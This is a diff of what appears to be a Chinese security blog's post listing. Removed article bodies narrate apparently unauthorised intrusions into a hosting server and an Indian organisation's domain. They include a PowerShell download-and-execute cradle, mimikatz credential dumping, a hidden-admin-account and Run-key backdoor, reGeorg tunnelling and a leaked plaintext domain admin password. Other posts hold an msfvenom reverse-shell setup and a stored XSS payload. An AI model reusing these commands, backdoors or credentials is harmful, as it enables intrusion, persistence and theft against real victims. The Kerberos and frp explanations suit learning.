@@ -298,16 +298,7 @@
     
 <div class="article-entry" itemprop="articleBody">
     
-        
         <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p><strong>这是前两个月用ueditor漏洞弄的一只站，当时看到是7i24就身心力竭的没有怎么细心看，技术不到家也占一部分哈哈哈，今天登上去看到C盘根目录有被mimikatz抓取得记录文件，觉得有希望，重新看看，站不少就打码处理了。</strong></p>
-<h3 id="前期收集信息"><a href="#前期收集信息" class="headerlink" title="前期收集信息"></a>前期收集信息</h3><p>先是Ueditor Getshell:<code>http://***.cn/ueditor/net/upload/image/20201017/6374348911245522335347148.aspx</code><br><img src="https://www.tu3k.cn/images/7i24/1.png" alt="7i24" title="星外主机提权"><br>通过目录发现是freehost主机，翻看目录确认是7i24的星外虚拟主机<br><img src="https://www.tu3k.cn/images/7i24/2.png" alt="freehost" title="freehost"><br>星外主机提权无非两三种</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">① iis低版本和服务器的ee提权</span><br><span class="line">② exp提权</span><br><span class="line">③ 第三方（几率很小都有防护措施）</span><br><span class="line">④ 其他方式</span><br></pre></td></tr></table></figure>
-<p>首先收集了下主机信息<br><img src="https://www.tu3k.cn/images/7i24/3.png" alt="systeminfo" title="systeminfo"><br>iis权限，权限挺大的，起码能执行命令，systeminfo收集了打的补丁情况和主机情况<br><img src="https://www.tu3k.cn/images/7i24/4.png" alt="bug" title="bug"><br>2008 R2/x64/200补丁，查了下漏洞补丁用了些ms16-032、烂土豆没提下，（当时是用烂土豆没提下），接着上了个aspx大马扫了下端口<br><img src="https://www.tu3k.cn/images/7i24/5.png" alt="scanport" title="scanport"><br>想着从mssql和mysql两个入口突破，翻查D盘找到了mysql数据库目录下载用户文件到本地得到root密码，没解开<br><img src="https://www.tu3k.cn/images/7i24/6.png" alt="3306提权" title="3306提权"><br>又访问了D:\freehost目录，发现可以跨目录访问，权限挺大，挨个网站去点，翻配置文件，最后翻到了两个sa的账号密码都没有登录成功  sa 123456/sa zxcv1010<br><img src="https://www.tu3k.cn/images/7i24/7.png" alt="1433提权" title="1433提权"><br>当时是直接无语，过了阵子又上去看这个站，发现C盘根目录被人传了mimikatz.exe和1.log 点进去发现竟然有服务器iis用户的密码，虽然里面没有管理员的，那人能执行mimikatz说明拿到了system权限，就准备重新试试，当时手里有个烂土豆的升级版。</p>
-<h3 id="艾斯比的提升权限"><a href="#艾斯比的提升权限" class="headerlink" title="艾斯比的提升权限"></a>艾斯比的提升权限</h3><p>先cs上了一个iis权限的shell，接着上传exp成功秒<br><img src="https://www.tu3k.cn/images/7i24/8.png" alt="上线cs" title="上线cs"><br>这里有个小细节：<br>针对freehost星外提权有个目录大部分是可读可写可执行的<br><code>&quot;C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Temporary ASP.NET Files\root\e22c2559\92c7e946\hash\&quot;</code><br>在这个目录传了exp，执行的时候需要用引号引起来因为目录有空格，实际执行的时候就算加了引号windows也会出现点问题<br><img src="https://www.tu3k.cn/images/7i24/9.png" alt="突破引号" title="突破引号"><br>例如这个 从中间目录空格处截断掉了，只需要再外围再加一次引号即可<br>“”C:\xxx\dj.exe” -p “whoami””<br>拿到system权限了，net localgroup administrators 查看有多少管理员<br><img src="https://www.tu3k.cn/images/7i24/10.png" alt="查看管理员" title="查看管理员"><br>接着上传了mimikatz抓密码，这里我很sb的在exp的语句内执行的<br><img src="https://www.tu3k.cn/images/7i24/11.png" alt="mimikatz" title="mimikatz"><br>没有进入mimikatz内执行，结果就是出现了很多问题导致抓取失败<br><img src="https://www.tu3k.cn/images/7i24/12.png" alt="faile" title="faile"><br>还传了nc想着能有个交互式的shell来执行mimikatz，服务端也确实接受到了，不过报错了ip: inverse host lookup failed: h_errno 11004: NO_DATA<br>什么命令都不能执行。后来甚至还试了msf上线，上线秒掉，又设置cs迁移到msf也是秒掉，再设置自动迁移进程set autorunscript migrate -n explorer.exe<br>也是掉，还静止等了三四分钟没有回弹过来， 怀疑是不是被拦了呀也没防护呀，又生成了个powershell脚本竟然连接都建立不上，直接给kali放到回收站了。<br>也是突然发现我直接在exp语句内执行cs上线的payload不就默认system权限了，就可以在cs抓密码了（当时不知道为什么执意要抓密码，可能是因为抓密码而起）<br><img src="https://www.tu3k.cn/images/7i24/13.png" alt="getsystem" title="getsystem"><br><img src="https://www.tu3k.cn/images/7i24/14.png" alt="getsystem2" title="getsystem2"><br>可以抓密码了，舒服<br><img src="https://www.tu3k.cn/images/7i24/15.png" alt="hashdump" title="hashdump"><br>解密1用户的密码 zxc123…    可以登录了<br>查询端口开放情况，没有发现3389，taslist /svc查询进程，通过进程来找3389也没有，可以，那就拿几个可疑的端口来登<br><img src="https://www.tu3k.cn/images/7i24/16.png" alt="登录8899端口" title="端口"><br><img src="https://www.tu3k.cn/images/7i24/17.png" alt="远程连接" title="远程连接"><br>协议错误代码0x1104，出现这个错误就是远程端口占用<br>直接开启3389即可<br><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code><br>再次查询端口<br><img src="https://www.tu3k.cn/images/7i24/18.png" alt="3389" title="3389"><br>连接即可<br><img src="https://www.tu3k.cn/images/7i24/19.png" alt="向日葵" title="向日葵"><br>发现7台远程向日葵主机，可直接控制，其他没啥了</p>
-<h3 id="维持权限篇"><a href="#维持权限篇" class="headerlink" title="维持权限篇"></a>维持权限篇</h3><h4 id="创建继承账号"><a href="#创建继承账号" class="headerlink" title="创建继承账号"></a>创建继承账号</h4><p>新建了一个继承了freehoststruts管理员权限的账号，Guest/@Tu3k.cn<br>先创建Guest账号，设置密码，接着禁用账号，来到注册表<br><img src="https://www.tu3k.cn/images/7i24/20.png" alt="注册表" title="注册表"><br>看到管理员和Guest的十六进制，找到对应的注册表文件夹，将管理员的复制，粘贴到Guest的里面即可<br><img src="https://www.tu3k.cn/images/7i24/21.png" alt="维持权限" title="维持权限"></p>
-<h4 id="添加注册表自启动"><a href="#添加注册表自启动" class="headerlink" title="添加注册表自启动"></a>添加注册表自启动</h4><p><code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v &quot;sqlserverD&quot; /t REG_SZ /d &quot;D\tu3k.exe&quot; /f</code><br><img src="https://www.tu3k.cn/images/7i24/22.png" alt="注册表自启动" title="注册表自启动"></p>
-<p>OVER，希望正在看文章的你能学到点东西。</p>
-
     
 </div>
     
@@ -320,6 +311,10 @@
         <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%98%9F%E5%A4%967i24%E6%8F%90%E6%9D%83/" rel="tag">星外7i24提权</a></li></ul>
     </div>
 
+      
+        <p class="article-more-link">
+          <a href="/2021/01/04/7i24tiquan/#more">more >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -365,18 +360,7 @@
     
 <div class="article-entry" itemprop="articleBody">
     
-        
         <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>2020年的12月31晚，团队群里发了个印度的站，当例子来给我这样的小白讲解基础的内网漫游，我对这方面一点知识都没有，只能先看着他们聊天然后慢慢切入正题，哈哈哈哈团队氛围特别好。整个过程发出来学习下</p>
-<h3 id="前渗透——getshell到登录服务器"><a href="#前渗透——getshell到登录服务器" class="headerlink" title="前渗透——getshell到登录服务器"></a>前渗透——getshell到登录服务器</h3><p>目标站：<a target="_blank" rel="noopener" href="http://122.**.**.205:8080/">http://122.**.**.205:8080/</a><br>目地：进入内网服务器，获取资产内网漫游，拿到域控<br>Jenkins漏洞 可以命令执行 默认system权限<br><code>println &quot;cmd.exe /c whoami&quot;.execute().text</code><br><img src="https://www.tu3k.cn/images/yindu/1.png" alt="1" title="1"><br>简单收集了下信息：<br>Windows2012     x64     内网服务器  存在飞塔杀软<br>接着cs生成个powershell脚本进行转发，没有上线</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;118.**.**.**&#x2F;payload.ps1&#39;))&quot;</span><br></pre></td></tr></table></figure>
-<p>又换了mshta等等常见反弹手法，均失败，且没有回显，ping百度返回超时，判断服务器没有出网，很难受<br><img src="https://www.tu3k.cn/images/yindu/2.png" alt="2" title="2"><br>内网服务器没有出网，也就是http协议的道已经走不通，尝试走dns隧道53端口协议反弹到cs，需解析配置好域名和vps地址（一定要配置正确，不然上线不了是因为配置问题那就sibi了），然后cs里开启dns监听，生成payload，但是dns生成的payload也得上传到shell里运行<br><img src="https://www.tu3k.cn/images/yindu/3.png" alt="3" title="3"><br>既然服务器http不通，远程下载payload并运行的方式也行不通，jsp的war包也不知道放在什么地方，这时我删掉了8080端口访问了下网站，可以访问，而且是iis管理器的默认主页，那就很好办了，dir命令找到iis默认目录C:\inetpub\wwwroot\，再使用echo写入一个asp一句话到网站根目录，注意转义双引号，访问空白菜刀连接。<br><img src="https://www.tu3k.cn/images/yindu/4.png" alt="4" title="4"><br><img src="https://www.tu3k.cn/images/yindu/5.png" alt="5" title="5"><br>赶紧传aspx大马秒掉他，结果网站目录任何文件传不了，可能是权限小<br><img src="https://www.tu3k.cn/images/yindu/6.png" alt="5" title="5"><br>iis权限那就先提个权，再弹个system权限到cs即可，提权没提下..那就反弹一个iis权限的shell也一样<br>没想到一传exe或者木马文件网站就把我墙了，挂上代理刷新文件夹exe确实传上去了，但只传了一半，陷入沉思…<br>挂了个代理能连上shell了，反手一个git clone <a target="_blank" rel="noopener" href="https://github.com/xxx/">https://github.com/xxx/</a>  项目原封不动的下到C:\ProgramData\ 里了<br>这就很好奇，不是不出http协议网吗，netstat -ano看了下<br><img src="https://www.tu3k.cn/images/yindu/7.png" alt="5" title="5"><br>发现有些端口与其他外网的443有连接<br>判断内网服务器是通https的，所以git clone可以远程下载，这里依次执行了exe、py、ps1都无法上线，无果准备翻翻网站磁盘文件点了点目录，网站不知道什么原因又把我墙了，直接无语，这样墙来墙去根本没心态了呀，寸步难行的。<br>突然想到在Jenkins里是system权限，于是找了个可写目录传aspx大马，接着move到网站根目录，拿到aspx大马就好办多了，而且是在浏览器端，解决了动不动就被墙的事故，而且可以本地传文件上去（还是以最初的想法传个ps木马反弹cs里进行转发进内网服务器）<br><img src="https://www.tu3k.cn/images/yindu/8.png" alt="5" title="5"><br><img src="https://www.tu3k.cn/images/yindu/9.png" alt="5" title="5"></p>
-<p>在C:\ProgramData\ 目录传了dns协议生成的ps木马，执行没反应，传raw生成的木马放到shellcode免杀里生成exe，执行也无回显，另一个朋友说他生成的上线了，不知道我的咋不行，shell内执行一直转圈，也不上线，本地测试秒上 。无头绪了，已经凌晨四点了，明天再搞（后来设置监听为http 监听端口为443  即可上线）</p>
-<p>第二天也是第二年2021年了，我叼一个站搞了两年哈哈哈哈：<br>既然有aspx大马， 前面也是system权限，我们的目的是为了进内网，既然cs上不了线，用reGeorg转发不也一样吗，去Jenkins里把一个管理员组的账号密码改了，然后aspx传tunnel.aspx到C:\ProgramData\  move到iis目录访问<br><img src="https://www.tu3k.cn/images/yindu/10.png" alt="5" title="5"><br>OK，本地reGeorg.py监听并配置Proxifier<br><code>python reGeorgSocksProxy.py -p 446 -u http://122.**.**.**/tunnel.aspx</code><br><img src="https://www.tu3k.cn/images/yindu/11.png" alt="5" title="5"><br>Proxifier配置：<br><img src="https://www.tu3k.cn/images/yindu/12.png" alt="5" title="5"><br>远程连接即可<br><img src="https://www.tu3k.cn/images/yindu/13.png" alt="5" title="5"><br>出现这个问题就是当前允许连接的用户过多<br>解决方案： mstsc /admin /v:192.168.15.82<br>连接，错误改变了<br><img src="https://www.tu3k.cn/images/yindu/14.png" alt="5" title="5"><br>网上的解决方法：<br><code>在\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System目录下新建项，在名称中输入CredSSP，在CredSSP上右键单击选择 新建》项 名称中输入Parameters确定，在Parameters上右键单击新建》DWORD（32位）值（D）修改名称为AllowEncryptionOracle 。在AllowEncryptionOracle 上右键单击选择修改，将“数值数据（V）”改为2，此时确定，关闭所有重新打开mstsc连接发现可以用了。</code><br><img src="https://www.tu3k.cn/images/yindu/15.png" alt="5" title="5"><br>登录:  mstsc /admin /v:192.168.52.18<br><img src="https://www.tu3k.cn/images/yindu/16.png" alt="5" title="5"><br>致此前渗透阶段完成。</p>
-<h3 id="后渗透——内网漫游拿域控"><a href="#后渗透——内网漫游拿域控" class="headerlink" title="后渗透——内网漫游拿域控"></a>后渗透——内网漫游拿域控</h3><p>上传mimikatz抓到当前机器administertor密码<br>使用超级弱口令扫了下整个b段的rdp，字典内加入抓取到的administertor密码，扫到8台机器<br><img src="https://www.tu3k.cn/images/yindu/17.png" alt="后渗透" title="5"><br>在这台机器的cs里执行hashdump获取登录凭证，并横向到192.168.15.70和76机器<br><img src="https://www.tu3k.cn/images/yindu/18.png" alt="5" title="后渗透"><br><img src="https://www.tu3k.cn/images/yindu/00.png" alt="5" title="5"><br><img src="https://www.tu3k.cn/images/yindu/20.png" alt="5" title="5"><br>可以看到成功横向上线<br>经过常规的信息收集，找到192.168.15.14这台机器为域控<br>到76机器执行mimikatz抓取域用户密码，尝试登录域控没有成功，可能权限不够<br>接着去看70机器，发现有个ssm服务，（sqlserverManage）此进程极大可能是域管运行，所以这台机器内存中可能存在域管密码，mimikatz抓取<br><img src="https://www.tu3k.cn/images/yindu/21.png" alt="5" title="5"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Username : Supertrans</span><br><span class="line"> Domain   : TRANSASIA</span><br><span class="line"> Password : Inde$b@$t$@ns</span><br></pre></td></tr></table></figure>
-<p><img src="https://www.tu3k.cn/images/yindu/22.png" alt="5" title="5"></p>
-<p>至此成功拿下域控。</p>
-
     
 </div>
     
@@ -389,6 +373,10 @@
         <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/" rel="tag">内网漫游</a></li></ul>
     </div>
 
+      
+        <p class="article-more-link">
+          <a href="/2021/01/03/yinduneiwang/#more">more >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -434,22 +422,7 @@
     
 <div class="article-entry" itemprop="articleBody">
     
-        
         <h2 id="kerberos的概念、作用"><a href="#kerberos的概念、作用" class="headerlink" title="kerberos的概念、作用"></a>kerberos的概念、作用</h2><p><strong>Kerberos是一种协议，是一种基于第三方可信主机的计算机网络协议，用来安全验证两台主机间的通信，域渗透中的黄金票据，白银票据等都基于kerberos</strong></p>
-<h2 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h2><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>例如A与B之间有个秘钥需要传输，A要向B证明这个秘钥是我给你的，首先A需要自己给秘钥加密，然后把明文发送给B，B拿到后会先解密，得到的和明文相符，则证明是A发送来的。<br>在网络中，秘钥是可以被截获和破解的，所以秘钥的加密又分为长期秘钥（Long time Key）和临时秘钥（Session Key），大部分都是用临时秘钥进行传输，因为就算黑客截获了密文，等到破解出来密文已经过期，需要重启验证。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">长期秘钥是长期存在的，例如存储在计算机用户的管理员NTLM-Hash </span><br><span class="line">短期秘钥就需要一个第三方可信任机构来生成，也就是KDC</span><br><span class="line">至此，三个介质已经介绍完毕，1、Client 2、Server 3、KDC</span><br></pre></td></tr></table></figure>
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>在A到B机器的完整通信中，需要经过几个介质的名称<br>1、Domain Controller（域控制器，也叫域控）简称DC，用于对域下计算机，用户的统一管理<br>2、KDC，秘钥分发中心<br>3、AS，身份验证服务，用于KDC对Client的认证<br>4、AD, 存储机器信息，用户组，域相关的信息<br>5、TGS,票据授予服务，用于KDC向Client和Server分发临时秘钥<br>6、Client 我们客户端<br>7、Server 对方服务端</p>
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>这里引进网上的一张流程图，算了对着画一张吧，我画画还是挺不错的<br><img src="https://www.tu3k.cn/images/kerberos/kerberos.png" alt="kerberos" title="kerberos"><br>1、首先Client向DC域控请求与Server产生通信，DC接到需求，先用AS服务去AD里查询A机器发起请求用户的信息，如果存在，返回一个与机器对应的TGT票据给Client<br>2、Client拿到票据，再次请求DC与Server产生通信，这时TGS服务拿到票据后会查询这个机器发来的票据权限有多大，是否具备访问权限等<br>3、如果有访问权限，或者权限更大，TGS会返回给Client一个ST（Service Ticket）票据，这个票据是用来与Server产生通信的门票<br>4、Client拿着ST去请求Server<br>5、产生通信。</p>
-<p><strong>总结：</strong><code>Client要访问Server，先让AS去AD里查询身份是否存在，认证通过后返回给Client一个TGT票据；Client再拿着TGT票据去请求TGS服务认证下权限，如果有权限，返回给Client一个ST；Client拿着ST直接和Serer产生通信。</code><br><img src="https://www.tu3k.cn/images/kerberos/sb.jpg" alt="yunliwuli" title="yunliwuli"></p>
-<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>以上就是整个的通信流程，如果理解了就不用看下面了，这里再仔细解读一下。</p>
-<h4 id="1、Client发送信息到AS进行认证并返回TGT票据"><a href="#1、Client发送信息到AS进行认证并返回TGT票据" class="headerlink" title="1、Client发送信息到AS进行认证并返回TGT票据"></a>1、Client发送信息到AS进行认证并返回TGT票据</h4><p>详情：<br> ① Client用自己的NTLM_Hash对当前时间、Client信息、服务信息进行加密发送到DC的AS服务<br> ② AS服务接收到查询请求会通过AD查询身份是否存在；如果存在则取出Client的NTLM_Hash，然后生成一个随机临时秘钥（Session Key），将临时秘钥用取出来的NTLM_Hash加密起来做为Client的一部分内容<br> ③ 还有一部分就是TGT：使用域控账户（krbtgt）的NTLM_Hash加密算法对Session Key、当前时间、客户端信息进行加密，然后将两部分内容返回给Client。（krbtgt是创建域控自动生成的账户）</p>
-<h4 id="2、请求TGS服务认真并拿到ST票据"><a href="#2、请求TGS服务认真并拿到ST票据" class="headerlink" title="2、请求TGS服务认真并拿到ST票据"></a>2、请求TGS服务认真并拿到ST票据</h4><p>详情：<br> ① Client收到AS发来的两部分内容后，先解密用自身NTLM_Hash加密的票据得到Session Key，并用临时秘钥加密Client Info和当前时间等信息<br> ② TGT的内容是域管krbtgt账户加密的，解密不开<br> ③ 两部分内容一起发送到TGS服务进行权限验证<br> ④ TGS服务收到后，用krbtgt的NTLM_Hash先解密TGT得到Session Key，再用Session Key去解密Client的内容包，得到当前时间等一些信息，并对两个包的当前时间进行比较，如果相差太多，需重新验证，还要拿TGT解密出来的Client信息和Session Key解密出来Client的信息作对比，必须一致。<br> ⑤ 接着判断Client有无权限访问Server，有权限，TGS也会产生一个随机秘钥(Session Key TGS)，接着返回给Client两部分内容，一部分是：Session Key加密的Session Key TGS（用来Client与Server之间通信的介质），另一部分：Server NTLM_Hash加密的数据(Session Key TGS、Client Info、当前时间)简称ST</p>
-<h4 id="3、Client拿着ST票据访问Server"><a href="#3、Client拿着ST票据访问Server" class="headerlink" title="3、Client拿着ST票据访问Server"></a>3、Client拿着ST票据访问Server</h4><p>详情：<br> ① Client收到返回的两部分内容，先解密出Session Key TGS，接着用解密出来的Session Key TGS加密Client信息(当前时间、Client Info)<br> ② ST是Server的NTLM_Hash加密的，解密不出，拼接前面的第一部分发送给Server</p>
-<h4 id="4、Server登场"><a href="#4、Server登场" class="headerlink" title="4、Server登场"></a>4、Server登场</h4><p>详情：<br> Server收到请求，用自身的NTLM_Hash解密出Session Key TGS，接着用Session Key TGS解密出Client信息，然后对比时间相差，如果没有超过八小时，则验证通过，建立通信</p>
-<h4 id="5、举例"><a href="#5、举例" class="headerlink" title="5、举例"></a>5、举例</h4><p>简单来说就是，我是一名六年级小学生（Client），现在要出校门（Server），需要拿到请假条（票据），我拿着写着我名字的假条（Client Info）去学生处（DC）找级部主任请假，他会先查我是哪个班的（AS-&gt;AD），查到后给我假条上盖个私章（krbtgt加密过的TGT），并告诉我去隔壁教务处盖批准章，我拿着盖着私章的假条到了隔壁教务处（TGS），教务处会看我是否有出校门的权利，如果符合条件，就给我盖上章录入出校系统（Server NTLM加密的Session Key TGS），接着出校门，一套动作行云流水。</p>
-<h2 id="域渗透中Kerberos的问题"><a href="#域渗透中Kerberos的问题" class="headerlink" title="域渗透中Kerberos的问题"></a>域渗透中Kerberos的问题</h2><p>黄金票据的问题出现在 TGT处<br>白银票据的问题出现在 ST处</p>
-<p><code>经典的ms14-068的问题是在权限认证的时候允许用户填入权限，造成了伪造管理员票据的漏洞</code></p>
-
     
 </div>
     
@@ -462,6 +435,10 @@
         <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kerberos/" rel="tag">kerberos</a></li></ul>
     </div>
 
+      
+        <p class="article-more-link">
+          <a href="/2020/12/29/kerberos-study/#more">more >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -507,22 +484,7 @@
     
 <div class="article-entry" itemprop="articleBody">
     
-        
         <h2 id="Frp简介"><a href="#Frp简介" class="headerlink" title="Frp简介"></a>Frp简介</h2><p><strong>这是一款基于服务端和客户端之间建立通信后，将客户端的某个端口转发到服务端访问</strong></p>
-<h2 id="使用教程"><a href="#使用教程" class="headerlink" title="使用教程"></a>使用教程</h2><p>下载地址：<code>https://github.com/fatedier/frp/releases</code><br>服务端：linux_amd64<br>客户端：windows_amd64<br><img src="https://www.tu3k.cn/images/frp/1.png" alt="frp_github" title="frp_github"><br>原理：自认为好理解。用一个端口(<code>bind_port = 5000</code>)将服务端和客户端产生通信，设置服务(frps.ini)和客户端(frpc.ini)相关参数，启动程序(frps.exe和frpc.exe)并指定程序文件(frps.ini和frpc.ini)，转发成功。<br><img src="https://www.tu3k.cn/images/frp/2.png" alt="frp_github1" title="frp_github1"><br>windows和linux都有这俩块文件，所以两个系统都可以转发内网到外网。<br>服务器IP：<code>kali——192.168.235.130</code><br>客户端IP：<code>Win10—192.168.1.155</code></p>
-<h3 id="0x01-WEB端的转发"><a href="#0x01-WEB端的转发" class="headerlink" title="0x01 WEB端的转发"></a>0x01 WEB端的转发</h3><p>服务端：<br>首先解压文件：<code>tar zxvf frp_0.34.3_linux_amd64.tar.gz</code><br>重命名文件夹：<code>mv frp_0.34.3_linux_amd64/ frp</code><br>使用root权限进行修改：<code>sudo gedit frps.ini</code><br><img src="https://www.tu3k.cn/images/frp/3.png" alt="frp_github2" title="frp_github2"><br>9999该端口就是以后访问web服务需要用到的端口  <code>192.168.235.130:9999</code>，访问这个链接就会链接到我们的内网地址，内网地址设置在后面有说。<br>保存退出，启动服务<br><code>./frps -c ./frps.ini</code><br><img src="https://www.tu3k.cn/images/frp/4.png" alt="frp_github3" title="frp_github3"><br>服务端配置完成。<br>客户端：<br>打开frpc.ini<br><img src="https://www.tu3k.cn/images/frp/5.png" alt="frp_github4" title="frp_github4"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 192.168.235.130         &#x2F;&#x2F;服务端的地址</span><br><span class="line">server_port &#x3D; 5000                与服务端建立通信的地址  也就是最上面提到的5000</span><br><span class="line">[服务]</span><br><span class="line">type &#x3D; http&#x2F;https                &#x2F;&#x2F;如果是https就写https    注意不要写错 不然接受转发不了</span><br><span class="line">local_ip &#x3D; 内网ip</span><br><span class="line">local_port &#x3D; 内网web服务端口或者其他服务端口</span><br><span class="line">custom_domains &#x3D; vps域名或IP</span><br></pre></td></tr></table></figure>
-<p>例：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[web]</span><br><span class="line">type &#x3D; http</span><br><span class="line">local_ip &#x3D; 192.168.1.155</span><br><span class="line">local_port &#x3D; 8080</span><br><span class="line">custom_domain &#x3D; 192.168.235.130</span><br></pre></td></tr></table></figure>
-<p>保存退出，打开cmd切到frp目录启动<br><code>frpc.exe -c frpc.ini</code><br><img src="https://www.tu3k.cn/images/frp/6.png" alt="frp_github5" title="frp_github5"><br>客户端设置完成。<br>此时访问vps ip：<code>http://192.168.235.130:9999/</code><br><img src="https://www.tu3k.cn/images/frp/7.png" alt="frp_github6" title="frp_github6"><br>就访问到了我们本机phpinfo。</p>
-<h3 id="0x02-3389端口转发"><a href="#0x02-3389端口转发" class="headerlink" title="0x02 3389端口转发"></a>0x02 3389端口转发</h3><p>只需在frpc.ini中添加</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[rdp]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 192.168.1.155</span><br><span class="line">local_port &#x3D; 3389</span><br><span class="line">remote_port &#x3D; 2030</span><br></pre></td></tr></table></figure>
-<p><img src="https://www.tu3k.cn/images/frp/8.png" alt="rdp" title="rdp"><br>3389是内网的远程端口，必须要开着才可以转发，2030是转发到外网的2030端口 进行连接，这里是转发到了我kali的2030，所以直接连接  kali-ip:2030  即可登录我的windows主机。<br><img src="https://www.tu3k.cn/images/frp/9.png" alt="rdp" title="rdp"></p>
-<h3 id="0x03-应用场景"><a href="#0x03-应用场景" class="headerlink" title="0x03 应用场景"></a>0x03 应用场景</h3><h4 id="0x03-①"><a href="#0x03-①" class="headerlink" title="0x03 ①"></a>0x03 ①</h4><p>webshell中可以先配置好ini文件然后上传客户端脚本到可执行目录<br>执行frpc.exe -c frpc.ini<br>有时候远程端口不是3389，需要手动去寻找一下远程端口是多少，再修改运行<br>接着我们本机连接vps-ip:转发的端口号  即可</p>
-<h4 id="0x03-②"><a href="#0x03-②" class="headerlink" title="0x03 ②"></a>0x03 ②</h4><p>将msf转发出网，接受反弹的shell<br>首先将服务端文件传到vps上面，配置好通信端口和转发端口 开始运行<br>注意：因为msf监听的payload是tcp 所以这里也要设置tcp<br><img src="https://www.tu3k.cn/images/frp/10.png" alt="msf" title="msf"><br>kali内也设置好类型为tcp<br><img src="https://www.tu3k.cn/images/frp/11.png" alt="msf1" title="msf1"><br>设置完毕启动后，在进行tcp访问vps的2222端口时，会转发到kali的4466端口上，建立shell连接。<br>首先创建payload<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=154.XXX.XXX.135 LPORT=2222 -f exe &gt; shell.exe</code><br>将payload传到目标机器，kali内msf设置监听4466端口</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.235.130</span><br><span class="line">set LPORT 4466</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<p>目标机器执行payload，tcp先会去连接vps的端口，然后vps端口转发到我们kali的4466.形成反弹shell<br><img src="https://www.tu3k.cn/images/frp/12.png" alt="msf1" title="msf1"></p>
-
     
 </div>
     
@@ -535,6 +497,10 @@
         <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Frp%E5%86%85%E7%BD%91%E8%BD%AC%E5%8F%91/" rel="tag">Frp内网转发</a></li></ul>
     </div>
 
+      
+        <p class="article-more-link">
+          <a href="/2020/12/28/frp/#more">more >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -580,17 +546,7 @@
     
 <div class="article-entry" itemprop="articleBody">
     
-        
         <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p><strong>国内某教育系统培训平台，漏洞已提交，发出来给基础的朋友看下</strong></p>
-<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><h3 id="0x01-URL跳转"><a href="#0x01-URL跳转" class="headerlink" title="0x01 URL跳转"></a>0x01 URL跳转</h3><p><code>http://***.***.edu.cn/***/***/***?nexturl=http://www.baidu.com</code><br><img src="https://www.tu3k.cn/images/edu/1.png" alt="url跳转" title="url跳转"></p>
-<p>正常获取验证码，登录后 会跳转到我们指定的目标站，结合下面的漏洞应该危害较大一些。</p>
-<h3 id="0x02-存储性XSS"><a href="#0x02-存储性XSS" class="headerlink" title="0x02 存储性XSS"></a>0x02 存储性XSS</h3><p>进入个人中心—&gt;个人信息你—&gt;发票信息，在发票单位名称 河南商丘<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src="https://www.tu3k.cn/images/edu/2.png" alt="存储xss" title="xss"></p>
-<p>保存，重新点击发票信息，ok，存储xss<br><img src="https://www.tu3k.cn/images/edu/3.png" alt="存储xss2" title="xss2"></p>
